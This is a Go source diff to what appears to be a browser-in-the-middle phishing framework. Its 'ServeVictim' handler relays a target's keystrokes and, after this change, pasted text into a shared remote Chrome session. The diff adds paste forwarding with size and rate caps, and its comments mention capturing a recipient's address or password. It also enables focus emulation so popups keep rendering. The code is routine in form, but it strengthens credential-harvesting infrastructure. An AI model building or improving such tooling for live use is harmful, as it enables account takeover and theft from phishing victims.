@@ -17,6 +17,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+	"unicode/utf8"
 
 	"github.com/gin-gonic/gin"
 	"github.com/go-rod/rod"
@@ -702,6 +703,15 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 		streamMouseMoveLast := map[string]time.Time{}
 		const streamMouseMoveMinInterval = 16 * time.Millisecond
 
+		// Paste is the only recipient input carrying a payload, and it is the only
+		// one whose cost in the browser scales with its size. In remote mode one
+		// browser serves every session, so an unbounded paste loop from a single
+		// recipient would degrade all of them. Bound both size and rate: an address
+		// or a password never comes close to the cap.
+		var streamPasteLast time.Time
+		const streamPasteMaxLen = 4096
+		const streamPasteMinInterval = 200 * time.Millisecond
+
 		for {
 			_, msg, err := conn.ReadMessage()
 			if err != nil {
@@ -733,6 +743,7 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 				KeyCode   int64           `json:"keyCode"`
 				Modifiers int64           `json:"modifiers"`
 				CharText  string          `json:"charText"`
+				Text      string          `json:"text"`
 				Width        float64      `json:"width"`
 				Height       float64      `json:"height"`
 				Dpr          float64      `json:"dpr"`
@@ -765,6 +776,33 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 				}
 				if val, exists := activeNamedStreams.Load(cmd.Name); exists {
 					si := val.(*streamInfo)
+					// Paste carries text, not a position, so it must not go through
+					// the coordinate mapping below, which drops the event whenever the
+					// stream box is not measured yet.
+					if cmd.Action == "paste" {
+						now := time.Now()
+						if cmd.Text == "" || now.Sub(streamPasteLast) < streamPasteMinInterval {
+							continue
+						}
+						streamPasteLast = now
+						text := cmd.Text
+						if len(text) > streamPasteMaxLen {
+							// Cut back to a rune boundary so a multi byte character
+							// split by the cap does not reach Chrome as broken UTF-8.
+							text = text[:streamPasteMaxLen]
+							for len(text) > 0 && !utf8.ValidString(text) {
+								text = text[:len(text)-1]
+							}
+						}
+						if page := sess.getBrowserPage(); page != nil {
+							payload, _ := json.Marshal(map[string]interface{}{
+								"type": "paste",
+								"text": text,
+							})
+							m.dispatchInput(page, payload)
+						}
+						continue
+					}
 					// cmd.X/Y are in cropped-canvas JPEG pixels; map back to CDP CSS coords.
 					cdpX, cdpY, ok := si.getInputCoords(cmd.X, cmd.Y)
 					if ok {
@@ -1299,6 +1337,11 @@ func (m *RemoteBrowserController) StreamLiveSession(g *gin.Context) {
 				if err != nil {
 					return false
 				}
+				// Focus emulation is set per target, so a popup starts without it and
+				// falls back to the real window focus. Only one window can hold that,
+				// which would leave a background popup reporting itself unfocused and
+				// stop it rendering.
+				proto.EmulationSetFocusEmulationEnabled{Enabled: true}.Call(newPage) //nolint:errcheck
 				tabsMu.Lock()
 				tabs[info.TargetID] = &tabEntry{page: newPage, url: info.URL}
 				tabsMu.Unlock()
